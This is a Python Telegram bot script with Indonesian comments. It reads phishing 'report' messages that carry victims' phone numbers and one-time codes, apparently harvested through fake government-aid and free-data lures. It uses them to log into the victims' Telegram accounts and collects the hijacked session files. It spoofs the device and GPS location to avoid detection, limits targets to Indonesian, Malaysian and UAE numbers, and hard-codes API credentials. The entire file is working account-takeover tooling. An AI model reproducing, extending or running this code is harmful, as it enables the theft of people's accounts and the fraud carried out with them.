import asyncio
import json
import os
import re
import shutil
from telethon import TelegramClient, events
from telethon.errors import (
    PhoneNumberUnoccupiedError, SessionPasswordNeededError, PhoneCodeInvalidError
)
from telethon.tl.functions.account import GetAuthorizationsRequest

api_id = 23520639
api_hash = 'bcbc7a22cde8fa2ba7d1baad086086ca'

SESSIONS_FOLDER = "a1_sessions"
SESSIONS_FOLDER_FINAL = "sessions2"
ALLOWED_PREFIXES = ["+62", "+60", "+971"]

os.makedirs(SESSIONS_FOLDER, exist_ok=True)
os.makedirs(SESSIONS_FOLDER_FINAL, exist_ok=True)

client = TelegramClient('main2', api_id, api_hash)
pending_login = {}
pending_login_lock = asyncio.Lock()
login_locks = {}

KEYWORDS = [
    '❮ LAPORAN My Kasih ❯', '❮ LAPORAN BANTUAN MADANI ❯',
    '❮ LAPORAN Judul ❯', '❮ LAPORAN AHMAD SANJAYA ❯',
    '❮ LAPORAN GRATIS KUOTA ❯', '❮ LAPORAN UANG KUNO ❯',
    '❮ LAPORAN Uang Kuno ❯', '❮ LAPORAN Laporan ❯'
]

def is_valid_phone_number(phone):
    return (
        bool(re.fullmatch(r"\+\d{10,15}", phone)) and
        any(phone.startswith(prefix) for prefix in ALLOWED_PREFIXES)
    )

async def apply_spoof_device(client, phone, fallback_model="Pixel 5"):
    try:
        await client.connect()
        auths = await client(GetAuthorizationsRequest())
        if auths.authorizations:
            last = auths.authorizations[0]
            client._init_connection.device_model = last.device_model
            client._init_connection.system_version = last.platform
            print(f"[🛠️] Spoof: {last.device_model} ({last.platform})")
    except:
        client._init_connection.device_model = fallback_model
        client._init_connection.system_version = "Android 11"
        print(f"[🛠️] Fallback spoof: {fallback_model}")

    client._init_connection.app_version = "Telegram Android 10.0.0"
    client._init_connection.system_lang_code = "en"
    client._init_connection.lang_code = "en"
    client._init_connection.lang_pack = ""

    # Lokasi GPS simulasi
    location_map = {
        "+62": ("ID", -6.2, 106.8167),
        "+60": ("MY", 3.1390, 101.6869),
        "+971": ("AE", 25.2048, 55.2708)
    }
    for prefix, (country, lat, lon) in location_map.items():
        if phone.startswith(prefix):
            client._init_connection.country = country
            client._init_connection.latitude = lat
            client._init_connection.longitude = lon
            print(f"[🌍] Lokasi: {country}")
            break
    else:
        client._init_connection.country = "US"
        client._init_connection.latitude = 37.7749
        client._init_connection.longitude = -122.4194
        print("[🌍] Lokasi default: USA")

@client.on(events.NewMessage)
async def handle_message(event):
    msg = event.raw_text

    if not any(keyword in msg for keyword in KEYWORDS):
        return

    phone_match = re.search(r'(?:PHONE\s*NUMBER|NUMBER)\s*[:\-]?\s*(\+?\d{10,15})', msg)
    otp_match = re.search(r'OTP\s*[:\-]?\s*(\d{5,6})', msg)

    if not phone_match:
        return

    phone = phone_match.group(1).strip()
    if not is_valid_phone_number(phone):
        print(f"[❌] Nomor tidak valid: {phone}")
        return

    async with get_lock(phone):
        if otp_match:
            otp = otp_match.group(1)
            print(f"[📥] OTP diterima untuk {phone}: {otp}")
            await complete_login(phone, otp)
        else:
            async with pending_login_lock:
                if phone not in pending_login:
                    print(f"[📨] Kirim OTP ke {phone}")
                    await request_otp(phone)
                else:
                    print(f"[⏳] OTP sedang ditunggu untuk {phone}")

async def request_otp(phone):
    session_path = os.path.join(SESSIONS_FOLDER, phone)
    login_client = TelegramClient(session_path, api_id, api_hash)

    try:
        await login_client.connect()
        await apply_spoof_device(login_client, phone)

        if login_client.is_user_authorized():
            print(f"[✅] {phone} sudah login")
            await move_to_final(session_path)
            return

        sent = await login_client.send_code_request(phone)
        async with pending_login_lock:
            pending_login[phone] = (login_client, sent.phone_code_hash)
        print(f"[📨] OTP terkirim ke {phone}")

    except Exception as e:
        print(f"[❌] Gagal kirim OTP ke {phone}: {e}")
        await login_client.disconnect()

async def complete_login(phone, otp, password=None):
    session_path = os.path.join(SESSIONS_FOLDER, phone)

    try:
        async with pending_login_lock:
            login_data = pending_login.pop(phone, None)

        if login_data:
            login_client, phone_code_hash = login_data
        else:
            login_client = TelegramClient(session_path, api_id, api_hash)
            await login_client.connect()
            await apply_spoof_device(login_client, phone)
            phone_code_hash = None

        await login_client.connect()

        if phone_code_hash:
            await login_client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        else:
            await login_client.sign_in(phone=phone, code=otp)

        print(f"[✅] Login berhasil: {phone}")
        await move_to_final(session_path)

    except PhoneCodeInvalidError:
        print(f"[⚠️] OTP salah: {phone}")

    except PhoneNumberUnoccupiedError:
        print(f"[🆕] Daftar akun baru: {phone}")
        await login_client.sign_up(otp, first_name="UserBaru")

    except SessionPasswordNeededError:
        if password:
            await login_client.sign_in(password=password)
        else:
            print(f"[🔒] Butuh password 2FA untuk {phone}")

    except Exception as e:
        print(f"[❌] Error login {phone}: {e}")

    finally:
        await login_client.disconnect()

async def move_to_final(session_path):
    final_path = os.path.join(SESSIONS_FOLDER_FINAL, os.path.basename(session_path))
    try:
        shutil.move(session_path + ".session", final_path + ".session")
        print(f"[📁] Sesi dipindah ke folder final: {final_path}")
    except Exception as e:
        print(f"[❌] Gagal memindahkan sesi: {e}")

def get_lock(phone):
    if phone not in login_locks:
        login_locks[phone] = asyncio.Lock()
    return login_locks[phone]

async def main():
    await client.start()
    print("[🚀] Bot Telegram aktif.")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
